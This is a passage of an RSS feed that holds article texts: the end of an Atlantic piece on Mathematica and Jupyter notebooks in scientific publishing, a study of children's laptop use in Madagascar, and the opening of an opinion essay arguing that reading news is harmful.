&lt;p&gt;The more of Wolfram you encounter, the more this seems to be his nature. The 1988 &lt;em&gt;Forbes&lt;/em&gt; profile about him tried to get to the root of it: “In the words of Harry Woolf, the former director of the prestigious Institute for Advanced Study in [Princeton, New Jersey]—where Wolfram, at 23, was one of the youngest senior researchers ever—he has ‘a cultivated difficulty of character added to an intrinsic sense of loneliness, isolation, and uniqueness.’”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-7&quot;&gt;&lt;p&gt;When one of Wolfram’s research assistants announced a significant mathematical discovery at a conference, which was a core part of &lt;em&gt;A New Kind of Science&lt;/em&gt;, Wolfram threatened to sue the hosts if they published it. “You won’t find any serious research group that would let a junior researcher tell what the senior researcher is doing,” he &lt;a href=&quot;https://www.timeshighereducation.com/features/new-kind-of-science-old-kind-of-sceptics/172398.article&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'3',r'556676'&quot;&gt;said&lt;/a&gt; at the time. Wolfram’s massive book was panned by academics for being derivative of other work and yet stingy with attribution. “He insinuates that he is largely responsible for basic ideas that have been central dogma in complex systems theory for 20 years,” a fellow researcher told the &lt;em&gt;Times Higher Education&lt;/em&gt; in 2002.&lt;/p&gt;
&lt;p&gt;Wolfram’s self-aggrandizement is especially vexing because it seems unnecessary. His achievements speak for themselves—if only he’d let them. Mathematica was a success almost as soon as it launched. Users were hungry for it; at universities, the program soon became as ubiquitous as Microsoft Word. Wolfram, in turn, used the steady revenue to hire more engineers and subject-matter experts, feeding more and more information to his insatiable program. Today Mathematica knows about the anatomy of a foot and the laws of physics; it knows about music, the taxonomy of coniferous trees, and the major battles of World War I. Wolfram himself helped teach the program an archaic Greek notation for numbers.&lt;/p&gt;
&lt;p&gt;All of this knowledge is “computable”: If you wanted, you could set “x” to be the location of the Battle of the Somme and “y” the daily precipitation, in 1916, within a 30-mile radius of that point, and use Mathematica to see whether World War I fighting was more or less deadly in the rain.&lt;/p&gt;
&lt;img alt=&quot;&quot; data-srcset=&quot;https://cdn.theatlantic.com/assets/media/img/posts/2018/03/image-1/c02b3f204.png&quot; class=&quot;lazyload&quot;/&gt;Courtesy of &lt;em&gt;&lt;a href=&quot;http://blog.stephenwolfram.com&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'4',r'556676'&quot;&gt;Stephen Wolfram Blog&lt;/a&gt;&lt;/em&gt;
&lt;p&gt;“I’ve noticed an interesting trend,” Wolfram wrote in a blog &lt;a href=&quot;http://blog.stephenwolfram.com/2016/09/how-to-teach-computational-thinking/&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'5',r'556676'&quot;&gt;post&lt;/a&gt;. “Pick any field X, from archeology to zoology. There either is now a ‘computational X’ or there soon will be. And it’s widely viewed as the future of the field.” As practitioners in those fields become more literate with computation, Wolfram argues, they’ll vastly expand the range of what’s discoverable. The Mathematica notebook could be an accelerant for science because it could spawn a new kind of thinking. “The place where it really gets exciting,” he says, “is where you have the same transition that happened in the 1600s when people started to be able to read math notation. It becomes a form of communication which has the incredibly important extra piece that you can actually run it, too.”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-8&quot;&gt;&lt;p&gt;The idea is that a “paper” of this sort would have all the dynamism Strogatz and Victor wanted—interactive diagrams interleaved within the text—with the added benefit that all the code generating those diagrams, and the data behind them, would be right there for the reader to see and play with. “Frankly, when you do something that is a nice clean Wolfram-language thing in a notebook, there’s no bullshit there. It is what it is, it does what it does. You don’t get to fudge your data,” Wolfram says.&lt;/p&gt;
&lt;p&gt;To write a paper in a Mathematica notebook is to reveal your results and methods at the same time; the published paper &lt;em&gt;and&lt;/em&gt; the work that begot it. Which shouldn’t just make it easier for readers to understand what you did—it should make it easier for them to replicate it (or not). With millions of scientists worldwide producing incremental contributions, the only way to have those contributions add up to something significant is if others can reliably build on them. “That’s what having science presented as computational essays can achieve,” Wolfram said.&lt;/p&gt;
&lt;p&gt;Wolfram says that he’s surprised the computational essay hasn’t taken off. He remembers working with Elsevier, the scientific publishing giant, all the way back in the early ’80s. “Elsevier hired me to do some consulting thing about ‘What would the future of scientific publishing look like?’” This was before the Mathematica notebook, but he gave them a spiel along the same lines. “A few years ago I was talking to some of their upper management again. I realized in this meeting, oh my gosh, I said exactly the same things 35 years ago!”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-9&quot;&gt;&lt;p&gt;I spoke to Theodore Gray, who has since left Wolfram Research to become a full-time writer. He said that his work on the notebook was in part motivated by the feeling, well formed already by the early 1990s, “that &lt;em&gt;obviously&lt;/em&gt; all scientific communication, all technical papers that involve any sort of data or mathematics or modeling or graphs or plots or anything like that, &lt;em&gt;obviously&lt;/em&gt; don’t belong on paper. That was just &lt;em&gt;completely obvious&lt;/em&gt; in, let’s say, 1990,” he said.&lt;/p&gt;
&lt;p&gt;“It’s been a source of ongoing bafflement and consternation for the past 29 years, that with the exception of a few people who get it, the community at large hasn’t really adopted it,” he said. “It’s incalculable, literally ... how much is lost, and how much time is wasted, and how many results are misinterpreted or are misrepresented.”&lt;/p&gt;
&lt;hr class=&quot;c-section-divider&quot;/&gt;&lt;p class=&quot;dropcap&quot;&gt;I&lt;span class=&quot;smallcaps&quot;&gt;n early&lt;/span&gt; 2001, Fernando Pérez found himself in much the same position Wolfram had 20 years earlier: He was a young graduate student in physics running up against the limits of his tools. He’d been using a hodgepodge of systems, Mathematica among them, feeling as though every task required switching from one to the next. He remembered having six or seven different programming-language books on his desk. What he wanted was a unified environment for scientific computing.&lt;/p&gt;
&lt;p&gt;But rather than going off and building a company, he found two far-flung scientists, a German oceanographer and a computer-science graduate student at Caltech, who had been thinking along the same lines. They’d all fallen in love with Python, an open-source, general-purpose programming language, and they’d all independently started building tools to make it work better for scientists: tools that made it easier to manage data sets and draw plots, and that encouraged a more exploratory programming style.&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-10&quot;&gt;&lt;p&gt;Pérez combined the three projects into one and took the reins. From the very beginning, the project, called IPython (the “I” for “Interactive”), was open-source: It wasn’t just that the program was free, but that anyone could inspect its code and modify it, contributing their changes back to the common cause. It was a deliberate decision. “I was interested in both the ethical aspect of being able to share my work with others,” Pérez told me—he came from Colombia, where access to proprietary software was harder to come by—“and there was also a more epistemological motivation.” He thought that if science was to be an open enterprise, the tools that are used to do it should themselves be open. Commercial software whose source code you were legally prohibited from reading was “antithetical to the idea of science,” where the very purpose is to open the black box of nature.&lt;/p&gt;
&lt;p&gt;Hence the allure of Python. Out of the box, Python is a much less powerful language than the Wolfram Language that powers Mathematica. But where Mathematica gets its powers from an army of Wolfram Research programmers, Python’s bare-bones core is supplemented by a massive library of extra features—for processing images, making music, building AIs, analyzing language, graphing data sets—built by a community of open-source contributors working for free. Python became a de facto standard for scientific computing because open-source developers like Pérez happened to build useful tools for it; and open-source developers have flocked to Python because it happens to be the de facto standard for scientific computing. Programming-language communities, like any social network, thrive—or die—on the strength of these feedback loops.&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-11&quot;&gt;&lt;p&gt;The idea for IPython’s notebook interface came from Mathematica. Pérez admired the way that Mathematica notebooks encouraged an exploratory style. “You would sketch something out—because that’s how you &lt;em&gt;reason&lt;/em&gt; about a problem, that’s how you understand a problem.” Computational notebooks, he said, “bring that idea of live narrative out ... You can think through the process, and you’re effectively using the computer, if you will, as a computational partner, and as a thinking partner.”&lt;/p&gt;
&lt;p&gt;Instead of building a specialized, stand-alone application, let alone spending man-centuries on it, the IPython team—Pérez was now joined by Brian Granger, a physics professor at California Polytechnic State University at San Luis Obispo; and Min Ragan-Kelley, a Ph.D. student at UC Berkeley working in computational physics—built their notebooks as simple web pages. The interface is missing Mathematica’s Steve Jobsian polish, and its sophistication. But by latching itself to the web, IPython got what is essentially free labor: Any time Google, Apple, or a random programmer open-sourced a new plotting tool, or published better code for rendering math, the improvement would get rolled into IPython. “It has paid off handsomely,” Pérez said.&lt;/p&gt;
&lt;p&gt;The paper announcing the first confirmed detection of &lt;a href=&quot;https://www.theatlantic.com/science/archive/2017/06/gravitational-waves-black-holes/528807/&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'6',r'556676'&quot;&gt;gravitational waves&lt;/a&gt; was published in the traditional way, as a PDF, but with a supplemental IPython &lt;a href=&quot;https://mybinder.org/v2/gh/losc-tutorial/LOSC_Event_tutorial/master&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'7',r'556676'&quot;&gt;notebook&lt;/a&gt;. The notebook walks through the work that generated every figure in the paper. Anyone who wants to can run the code for themselves, tweaking parts of it as they see fit, playing with the calculations to get a better handle on how each one works. At a certain point in the notebook, it gets to the part where the signal that generated the gravitational waves is processed into sound, and this you can play in your browser, hearing for yourself what the scientists heard first, the bloop of two black holes colliding.&lt;/p&gt;

&lt;p&gt;“I think what they have is acceptance from the scientific community as a tool that is considered to be universal,” Theodore Gray says of Pérez’s group. “And that’s the thing that Mathematica never really so far has achieved.” There are now 1.3 million of these notebooks hosted publicly on Github. They’re in use at Google, Bloomberg, and &lt;span class=&quot;smallcaps&quot;&gt;NASA&lt;/span&gt;; by musicians, teachers, and AI researchers; and in “almost &lt;a href=&quot;https://blog.jupyter.org/jupyterlab-is-ready-for-users-5a6f039b8906&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'8',r'556676'&quot;&gt;every country&lt;/a&gt; on Earth.”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-12&quot;&gt;&lt;p&gt;At every turn, IPython chose the way that was more inclusive, to the point where it’s no longer called “IPython”: The project rebranded itself as “Jupyter” in 2014 to recognize the fact that it was no longer just for Python. The Jupyter notebook, as it’s called, is like a Mathematica notebook but for any programming language. You can have a Python notebook, or a C notebook, or an R notebook, or Ruby, or Javascript, or Julia. Anyone can build support for their programming language in Jupyter. Today it supports more than 100 languages.&lt;/p&gt;
&lt;p&gt;Theodore Gray, who developed the original Mathematica notebook interface, said that he once as an experiment tried to build support for other programming languages into it. “It never went anywhere,” he told me. “The company had no interest in supporting this. And also because when you have to support a lot of different languages, you can’t do it as deeply.”&lt;/p&gt;
&lt;p&gt;A 1997 &lt;a href=&quot;http://www.catb.org/esr/writings/cathedral-bazaar/cathedral-bazaar/index.html#catbmain&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'9',r'556676'&quot;&gt;essay&lt;/a&gt; by Eric S. Raymond titled “The Cathedral and the Bazaar,” in some sense the founding document of the modern open-source movement, challenged the notion that complex software had to be built like a cathedral, “carefully crafted by individual wizards or small bands of mages working in splendid isolation.” Raymond’s experience as one of the stewards of the Linux kernel (a piece of open-source software that powers all of the world’s 500 most powerful supercomputers, and the vast majority of mobile devices) taught him that the “great babbling bazaar of differing agendas and approaches” that defined open-source projects was actually a strength. “The fact that this bazaar style seemed to work, and work well, came as a distinct shock,” he wrote. The essay was his attempt to reckon with why “the Linux world not only didn’t fly apart in confusion but seemed to go from strength to strength at a speed barely imaginable to cathedral builders.”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-13&quot;&gt;&lt;p&gt;Mathematica was in development long before Raymond’s formative experience with Linux, and has been in development long after it. It is the quintessential cathedral, and its builders are still skeptical of the bazaar. “There’s always chaos,” Gray said about open-source systems. “The number of moving parts is so vast, and several of them are under the control of different groups. There’s no way you could ever pull it together into an integrated system in the same way as you can in a single commercial product with, you know, a single maniac in the middle.”&lt;/p&gt;
&lt;p&gt;The maniac is, of course, Stephen Wolfram. Gray pointed out that the trains ran on time under Mussolini. “It’s a bad analogy,” he said, but still, “I’m all in favor of there being a maniac in the middle.” The Mathematica notebook is the more coherently designed, more polished product—in large part because every decision that went into building it emanated from the mind of a single, opinionated genius. “I see these Jupyter guys,” Wolfram said to me, “they are about on a par with what we had in the early 1990s.” They’ve taken shortcuts, he said. “We actually want to try and do it right.”&lt;/p&gt;
&lt;p&gt;But it’s hard to sell the scientific community on a piece of commercial software. Even though Wolfram Research has given away a free Mathematica notebook viewer for years, and even though most major universities already have a site license that lets their students and faculty use Mathematica freely, it might be too much to ask publishers to abandon PDFs, an open format, for a proprietary product. “Right now if you make a Mathematica notebook and you try to send that to a journal,” Gray says, “they’re gonna complain: Well, we don’t have Mathematica, this is an expensive product—give us something that’s more of a standard.”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-14&quot;&gt;&lt;p&gt;It doesn’t help that Wolfram—the man, and to some extent the company—touts Mathematica’s superiority, its &lt;em&gt;necessity&lt;/em&gt;, in a way that even Gray describes as being a bit like how CrossFit people won’t shut up about CrossFit. This is, after all, the same Stephen Wolfram who titled a book about his own work on cellular automata &lt;em&gt;A New Kind of Science&lt;/em&gt;. In his &lt;a href=&quot;http://blog.stephenwolfram.com/2017/11/what-is-a-computational-essay/&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'10',r'556676'&quot;&gt;blog post&lt;/a&gt; about computational essays, he writes, “At the core of computational essays is the idea of expressing computational thoughts using the Wolfram Language.”&lt;/p&gt;
&lt;img alt=&quot;&quot; data-srcset=&quot;https://cdn.theatlantic.com/assets/media/img/posts/2018/03/image_2-1/cf588dbcd.png&quot; class=&quot;lazyload&quot;/&gt;Google Trends
&lt;p&gt;Which, who knows, might well be true—maybe computational notebooks will only take root if they’re backed by a single super-language, or by a company with deep pockets and a vested interest in making them work. But it seems just as likely that the opposite is true. A federated effort, while more chaotic, might also be more robust—and the only way to win the trust of the scientific community.&lt;/p&gt;
&lt;p&gt;Wolfram has a hard time seeing outside Wolfram, and perhaps that’s the reason that the Mathematica notebook has remained relatively obscure while a rival system—derivative, yes, and simplistic, but open—looks to be taking over the world.&lt;/p&gt;
&lt;hr class=&quot;c-section-divider&quot;/&gt;&lt;p class=&quot;dropcap&quot;&gt;I&lt;span class=&quot;smallcaps&quot;&gt;t’ll be some&lt;/span&gt; time before computational notebooks replace PDFs in scientific journals, because that would mean changing the incentive structure of science itself. Until journals &lt;em&gt;require&lt;/em&gt; scientists to submit notebooks, and until sharing your work and your data becomes the way to earn prestige, or funding, people will likely just keep doing what they’re doing.&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-15&quot;&gt;&lt;p&gt;I spoke to a neuroscientist-turned-software-developer who contributed to Jupyter, who told me that the professor in charge of his former lab was originally an electrophysiologist—he actually measured neuronal activity with implanted electrodes. “This kind of data is basically so costly, so expensive, and so good,” he said, that nobody would ever share it. “You collect one batch of data and you can mine it for the rest of your career.”&lt;/p&gt;
&lt;p&gt;“At this point, nobody in their sane mind challenges the fact that the &lt;em&gt;praxis&lt;/em&gt; of scientific research is under major upheaval,” Pérez, the creator of Jupyter, wrote in a blog post in 2013. As science becomes more about computation, the skills required to be a good scientist become increasingly attractive in industry. Universities lose their best people to start-ups, to Google and Microsoft. “I have seen many talented colleagues leave academia in frustration over the last decade,” he wrote, “and I can’t think of a single one who wasn’t &lt;em&gt;happier&lt;/em&gt; years later.”&lt;/p&gt;
&lt;p&gt;Pérez told me stories of scientists who sacrificed their academic careers to build software, because building software counted for so little in their field: The creator of matplotlib, probably the most widely used tool for generating plots in scientific papers, was a postdoc in neuroscience but had to leave academia for industry. The same thing happened to the creator of NumPy, a now-ubiquitous tool for numerical computing. Pérez himself said, “I did get straight-out blunt comments from many, many colleagues, and from senior people and mentors who said: Stop doing this, you’re wasting your career, you’re wasting your talent.” Unabashedly, he said, they’d tell him to “go back to physics and mathematics and writing papers.”&lt;/p&gt;
&lt;aside class=&quot;callout&quot; data-omni-click=&quot;r'article',r' ',d,r'related',#data-omni-index,@data-article-id&quot;&gt;&lt;hr/&gt;&lt;h4&gt;Related Story&lt;/h4&gt;
&lt;div&gt;&lt;a href=&quot;https://www.theatlantic.com/technology/archive/2017/09/saving-the-world-from-code/540393/&quot; data-omni-index=&quot;0&quot; data-article-id=&quot;929549&quot; data-omni-click=&quot;inherit&quot;&gt;&lt;img width=&quot;242&quot; src=&quot;https://cdn.theatlantic.com/assets/media/img/mt/2017/09/TheAtlantic_CodeFinal3/thumb_wide_medium.png?1522773597&quot; alt=&quot;Cartoonish figures interact with the world through code.&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://www.theatlantic.com/technology/archive/2017/09/saving-the-world-from-code/540393/&quot; data-omni-index=&quot;0&quot; data-article-id=&quot;929549&quot; data-omni-click=&quot;inherit&quot;&gt;The Coming Software Apocalypse&lt;/a&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;/aside&gt;&lt;p&gt;Still, those who stay are making progress. Pérez himself recently got a faculty appointment in the stats department at Berkeley. The day after we spoke, he was slated to teach an upper-division data-science course, built entirely on Python and Jupyter notebooks. “The freshman version of that course had in the fall I think 1,200 students,” he said. “It’s been the fastest-growing course in the history of UC Berkeley. And it’s all based on these open-source tools.”&lt;/p&gt;
&lt;p&gt;When you improve the praxis of science, the dream is that you’ll improve its products, too. Leibniz’s notation, by making it easier to do calculus, expanded the space of what it was possible to think. The grand scientific challenges of our day are as often as not computational puzzles: How to integrate billions of base pairs of genomic data, and 10 times that amount of proteomic data, and historical patient data, and the results of pharmacological screens into a coherent account of how somebody got sick and what to do to make them better? How to make actionable an endless stream of new temperature and precipitation data, and oceanographic and volcanic and seismic data? How to build, and make sense of, a neuron-by-neuron map of a thinking brain? Equipping scientists with computational notebooks, or some evolved form of them, might bring their minds to a level with problems now out of reach.&lt;/p&gt;
&lt;p&gt;At one point, Pérez told me the name Jupyter honored Galileo, perhaps the first modern scientist. The Jupyter logo is an abstracted version of Galileo’s original drawings of the moons of Jupiter. “Galileo couldn’t go anywhere to buy a telescope,” Pérez said. “He had to build his own.”&lt;/p&gt;
&lt;/section&gt;</description>
<pubDate>Thu, 05 Apr 2018 12:44:42 +0000</pubDate>
<dc:creator>jsomers</dc:creator>
<og:title>The Scientific Paper Is Obsolete</og:title>
<og:type>article</og:type>
<og:url>https://www.theatlantic.com/science/archive/2018/04/the-scientific-paper-is-obsolete/556676/</og:url>
<og:image>https://cdn.theatlantic.com/assets/media/img/mt/2018/04/FlameNew_1/facebook.gif?1522865303</og:image>
<og:description>Here's what's next.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.theatlantic.com/science/archive/2018/04/the-scientific-paper-is-obsolete/556676/?single_page=true</dc:identifier>
</item>
<item>
<title>How kids in a low-income country use laptops: lessons from Madagascar</title>
<link>https://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</link>
<guid isPermaLink="true" >https://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</guid>
<description>&lt;p&gt;Every child, no matter what country they’re from or their social background, should have the chance to use and learn about technology. That’s the thinking behind a number of projects led by international organisations like &lt;a href=&quot;https://en.unesco.org/themes/ict-education&quot;&gt;UNESCO&lt;/a&gt; and UNICEF. They hope to bolster education and economic growth by making digital technologies available in the developing world.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;http://one.laptop.org/&quot;&gt;One Laptop Per Child project&lt;/a&gt; was a pioneer in this field. This educational project, launched by the MIT in 2005, produces &lt;a href=&quot;http://laptop.org/en/laptop/&quot;&gt;laptop computers&lt;/a&gt; suitable for children aged between 6 and 12. These are loaded with an operating system that features free educational software called &lt;a href=&quot;https://sugarlabs.org/&quot;&gt;Sugar&lt;/a&gt;. The programme has been rolled out at schools in more than 30 countries.&lt;/p&gt;
&lt;p&gt;The project aims to equip all primary school children and all teachers with computers in a way that involves communities and that ensures everyone feels a sense of responsibility for the equipment. For example, kids aged six to 12 own their computers and can take them home to use.&lt;/p&gt;
&lt;p&gt;Research &lt;a href=&quot;http://journals.sagepub.com/doi/abs/10.3102/0034654316628645&quot;&gt;shows&lt;/a&gt; that using technology in school makes children more engaged with learning. We wanted to know how children in low-income countries use laptops in their everyday lives; in school and after class. To find out, we embarked &lt;a href=&quot;https://www.tandfonline.com/eprint/cv4y7UqYqzxcWtcNAuEe/full&quot;&gt;on a study&lt;/a&gt; in a village in Madagascar four years after the project was launched there.&lt;/p&gt;
&lt;p&gt;Our results show that the use of computers in low-income countries supports formal and informal learning activities at home. It provides easy access to information, educational games and tools for self-expression.&lt;/p&gt;
&lt;h2&gt;Use at school&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://datatopics.worldbank.org/education/country/madagascar&quot;&gt;Madagascar&lt;/a&gt;, an island nation off Africa’s southeast coast, is extremely poor: 75% of the population (25 million) live below the poverty line, and the country scores low on the &lt;a href=&quot;http://hdr.undp.org/en/content/human-development-index-hdi&quot;&gt;human development index&lt;/a&gt;, performing poorly in areas like education and living standards.&lt;/p&gt;
&lt;p&gt;The study was conducted in a village located on the island of Nosy Komba, in the northeast of the country. Laptops are seen among residents there as high status objects because they cost a lot of money. None of the parents we interviewed could afford to buy one. They also have a high symbolic value: parents believe that if their children can master laptop use they will become more intelligent and develop professional skills.&lt;/p&gt;
&lt;p&gt;A programme was rolled out in the village by &lt;a href=&quot;https://olpc-france.org/&quot;&gt;One Laptop Per Child France&lt;/a&gt; and another French organisation, &lt;a href=&quot;https://www.facebook.com/GducoeurESGMS&quot;&gt;Gducœur&lt;/a&gt;. They supplied laptops and provided technical, logistical, administrative, financial and educational support. The laptops were given to 160 children aged between 5 and 15 enrolled in the village’s primary school.&lt;/p&gt;
&lt;p&gt;Our analysis was both quantitative and a qualitative. We examined logs that showed which applications the children had used on their laptops during the previous 12 months; we analysed what they’d produced – for instance, recorded files. And we interviewed the children and their parents.&lt;/p&gt;
&lt;p&gt;The results showed that the laptops were used very differently at school and in the children’s homes. At school, computers were generally used to learn about word processing, to play educational games and to support creative activities (drawing, digital story telling). Computers were also used as a virtual learning environment that offered a range of resources unavailable in the classroom like calculators, ebooks, maps, a watch, measuring tools and so on.&lt;/p&gt;
&lt;a href=&quot;https://images.theconversation.com/files/210319/original/file-20180314-113482-or0fvs.jpg?ixlib=rb-1.1.0&amp;amp;q=45&amp;amp;auto=format&amp;amp;w=1000&amp;amp;fit=clip&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://images.theconversation.com/files/210319/original/file-20180314-113482-or0fvs.jpg?ixlib=rb-1.1.0&amp;amp;q=45&amp;amp;auto=format&amp;amp;w=237&amp;amp;fit=clip&quot;/&gt;&lt;/a&gt; &lt;span class=&quot;caption&quot;&gt;A teacher at work with his class in the Nosy Komba primary school.&lt;/span&gt; &lt;span class=&quot;attribution&quot;&gt;&lt;span class=&quot;source&quot;&gt;http://www.nosykombaproject.org/gallerie-photos/&lt;/span&gt;&lt;/span&gt;
&lt;p&gt;At home the children, like their peers in developed countries, largely used computers to take photos or make videos, listen to music, play games, share content and do homework. The younger children tended to use fewer reading and writing applications. Those in the equivalent of fourth and fifth grade used more digital books; they also shared images and videos more frequently with their friends.&lt;/p&gt;
&lt;h2&gt;Similarities and differences&lt;/h2&gt;
&lt;p&gt;Our findings suggest that developing countries like Madagascar have something in common with western nations when it comes to laptop use, such as how the children used the computers at home.&lt;/p&gt;
&lt;p&gt;But there was one marked difference: computer use in Madagascar tended to be a collective rather than an individual practice. Children and their families would gather around one laptop to play educational games, take photos or make videos. Computers were being used to strengthen existing social relations among siblings, parents and peers.&lt;/p&gt;
&lt;p&gt;All of this is important and valuable. Laptops have introduced the children of Nosy Komba to previously inaccessible tools. But we found that original projects were limited. While applications used were designed to foster creativity, children need support to develop creativity skills.&lt;/p&gt;
&lt;p&gt;Educators have a crucial role to play here. They can help to nurture children’s creativity: the can help them to connect their lived experience and to express their imagination to produce original content. This will unlock new forms of expression and different kinds of literacy, including visual.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This article was co-authored with Pierre Varly, an international consultant in quantitative methods in education. He runs &lt;a href=&quot;https://varlyproject.wordpress.com/&quot;&gt;a blog&lt;/a&gt; on education in developing countries.&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 12:12:32 +0000</pubDate>
<dc:creator>rbanffy</dc:creator>
<og:title>How kids in a low-income country use laptops: lessons from Madagascar</og:title>
<og:description>Laptops have introduced the children of Nosy Komba in Madagascar to previously inaccessible tools.</og:description>
<og:type>article</og:type>
<og:image>https://images.theconversation.com/files/210317/original/file-20180314-113462-1kgcrn1.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=1356&amp;h=668&amp;fit=crop</og:image>
<og:url>http://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</dc:identifier>
</item>
<item>
<title>Giving up reading news will make us happier</title>
<link>https://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</link>
<guid isPermaLink="true" >https://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</guid>
<description>&lt;p&gt;&lt;span class=&quot;drop-cap&quot;&gt;&lt;span class=&quot;drop-cap__inner&quot;&gt;I&lt;/span&gt;&lt;/span&gt;n the past few decades, the fortunate among us have recognised the hazards of living with an overabundance of food (obesity, diabetes) and have started to change our diets. But most of us do not yet understand that news is to the mind what sugar is to the body. News is easy to digest. The media feeds us small bites of trivial matter, tidbits that don't really concern our lives and don't require thinking. That's why we experience almost no saturation. Unlike reading books and long magazine articles (which require thinking), we can swallow limitless quantities of news flashes, which are bright-coloured candies for the mind. Today, we have reached the same point in relation to information that we faced 20 years ago in regard to food. We are beginning to recognise how toxic news can be.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News misleads.&lt;/strong&gt; Take the following event (borrowed from Nassim Taleb). A car drives over a bridge, and the bridge collapses. What does the news media focus on? The car. The person in the car. Where he came from. Where he planned to go. How he experienced the crash (if he survived). But that is all irrelevant. What's relevant? The structural stability of the bridge. That's the underlying risk that has been lurking, and could lurk in other bridges. But the car is flashy, it's dramatic, it's a person (non-abstract), and it's news that's cheap to produce. News leads us to walk around with the completely wrong risk map in our heads. So terrorism is over-rated. Chronic stress is under-rated. The collapse of Lehman Brothers is overrated. Fiscal irresponsibility is under-rated. Astronauts are over-rated. Nurses are under-rated.&lt;/p&gt;
&lt;p&gt;We are not rational enough to be exposed to the press. Watching an airplane crash on television is going to change your attitude toward that risk, regardless of its real probability. If you think you can compensate with the strength of your own inner contemplation, you are wrong. Bankers and economists – who have powerful incentives to compensate for news-borne hazards – have shown that they cannot. The only solution: cut yourself off from news consumption entirely.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News is irrelevant.&lt;/strong&gt; Out of the approximately 10,000 news stories you have read in the last 12 months, name one that – because you consumed it – allowed you to make a better decision about a serious matter affecting your life, your career or your business. The point is: the consumption of news is irrelevant to you. But people find it very difficult to recognise what's relevant. It's much easier to recognise what's new. The relevant versus the new is the fundamental battle of the current age. Media organisations want you to believe that news offers you some sort of a competitive advantage. Many fall for that. We get anxious when we're cut off from the flow of news. In reality, news consumption is a competitive disadvantage. The less news you consume, the bigger the advantage you have.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News has no explanatory power.&lt;/strong&gt; News items are bubbles popping on the surface of a deeper world. Will accumulating facts help you understand the world? Sadly, no. The relationship is inverted. The important stories are non-stories: slow, powerful movements that develop below journalists' radar but have a transforming effect. The more &quot;news factoids&quot; you digest, the less of the big picture you will understand. If more information leads to higher economic success, we'd expect journalists to be at the top of the pyramid. That's not the case.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News is toxic to your body.&lt;/strong&gt; It constantly triggers the &lt;a href=&quot;https://www.theguardian.com/science/neurophilosophy/2012/may/16/neuroscience-psychology&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;limbic system&lt;/a&gt;. Panicky stories spur the release of cascades of glucocorticoid (cortisol). This deregulates your immune system and inhibits the release of growth hormones. In other words, your body finds itself in a state of chronic stress. High glucocorticoid levels cause impaired digestion, lack of growth (cell, hair, bone), nervousness and susceptibility to infections. The other potential side-effects include fear, aggression, tunnel-vision and desensitisation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News increases cognitive errors.&lt;/strong&gt; News feeds the mother of all cognitive errors: confirmation bias. In the words of Warren Buffett: &quot;What the human being is best at doing is interpreting all new information so that their prior conclusions remain intact.&quot; News exacerbates this flaw. We become prone to overconfidence, take stupid risks and misjudge opportunities. It also exacerbates another cognitive error: the story bias. Our brains crave stories that &quot;make sense&quot; – even if they don't correspond to reality. Any journalist who writes, &quot;The market moved because of X&quot; or &quot;the company went bankrupt because of Y&quot; is an idiot. I am fed up with this cheap way of &quot;explaining&quot; the world.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News inhibits thinking.&lt;/strong&gt; Thinking requires concentration. Concentration requires uninterrupted time. News pieces are specifically engineered to interrupt you. They are like viruses that steal attention for their own purposes. News makes us shallow thinkers. But it's worse than that. News severely affects memory. There are two types of memory. Long-range memory's capacity is nearly infinite, but working memory is limited to a certain amount of slippery data. The path from short-term to long-term memory is a choke-point in the brain, but anything you want to understand must pass through it. If this passageway is disrupted, nothing gets through. Because news disrupts concentration, it weakens comprehension. Online news has an even worse impact. &lt;a href=&quot;http://www.wired.com/magazine/2010/05/ff_nicholas_carr/&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;In a 2001 study two scholars in Canada&lt;/a&gt; showed that comprehension declines as the number of hyperlinks in a document increases. Why? Because whenever a link appears, your brain has to at least make the choice not to click, which in itself is distracting. News is an intentional interruption system.&lt;/p&gt;
